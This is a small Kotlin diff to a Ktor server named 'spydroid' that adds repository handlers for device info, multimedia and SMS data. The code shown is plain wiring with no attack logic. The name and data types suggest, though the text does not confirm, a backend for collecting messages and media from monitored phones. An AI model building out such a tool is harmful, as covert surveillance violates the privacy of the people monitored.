@@ -20,6 +20,9 @@ package net.spydroid.server
 import io.ktor.server.application.*
 import io.ktor.server.netty.EngineMain
 import net.spydroid.server.data.DevicesRepositoryHandler
+import net.spydroid.server.data.InfoRepositoryHandler
+import net.spydroid.server.data.MultimediaRepositoryHandler
+import net.spydroid.server.data.SmsRepositoryHandler
 import net.spydroid.server.plugins.configureDatabases
 import net.spydroid.server.plugins.configureRouting
 import net.spydroid.server.plugins.configureSerialization
@@ -31,6 +34,9 @@ fun main(args: Array<String>) {
 fun Application.module() {
 
     val devicesRepository = DevicesRepositoryHandler()
+    val infoRepository = InfoRepositoryHandler()
+    val multimediaRepository = MultimediaRepositoryHandler()
+    val smsRepository = SmsRepositoryHandler()
 
     configureDatabases(devicesRepository = devicesRepository)
     configureSerialization()
